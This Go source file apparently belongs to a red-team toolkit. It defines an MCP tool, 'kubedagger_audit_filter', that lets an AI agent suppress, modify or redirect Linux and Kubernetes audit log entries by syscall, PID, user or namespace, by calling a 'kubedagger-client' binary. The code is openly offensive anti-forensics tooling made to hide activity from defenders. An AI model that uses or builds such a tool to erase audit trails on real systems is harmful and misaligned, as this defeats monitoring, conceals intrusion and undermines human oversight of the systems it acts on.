package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type AuditFilterInput struct {
	Action    string `json:"action"`
	Syscall   string `json:"syscall,omitempty"`
	PID       int    `json:"pid,omitempty"`
	User      string `json:"user,omitempty"`
	Namespace string `json:"namespace,omitempty"`
}

type AuditFilterTool struct {
	exec executor.Executor
}

func NewAuditFilter(exec executor.Executor) *AuditFilterTool {
	return &AuditFilterTool{exec: exec}
}

func (t *AuditFilterTool) Name() string { return "kubedagger_audit_filter" }

func (t *AuditFilterTool) Description() string {
	return "Suppress Linux audit and Kubernetes audit log entries by intercepting audit_log_start and kube-apiserver audit webhook calls. Filters events matching specified criteria before they reach the audit backend."
}

func (t *AuditFilterTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["suppress", "modify", "redirect", "status"],
				"description": "Filter action"
			},
			"syscall": {
				"type": "string",
				"description": "Syscall name to suppress from audit (e.g., 'execve', 'connect')"
			},
			"pid": {
				"type": "integer",
				"description": "Suppress all audit events from this PID"
			},
			"user": {
				"type": "string",
				"description": "Suppress events from this user/service account"
			},
			"namespace": {
				"type": "string",
				"description": "Suppress Kubernetes audit events from this namespace"
			}
		},
		"required": ["action"]
	}`)
}

func (t *AuditFilterTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input AuditFilterInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Syscall, "syscall"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.User, "user"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"audit-filter", "--action", input.Action}
	if input.Syscall != "" {
		args = append(args, "--syscall", input.Syscall)
	}
	if input.PID > 0 {
		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
	}
	if input.User != "" {
		args = append(args, "--user", input.User)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger audit-filter failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Audit Filter: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Filter active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
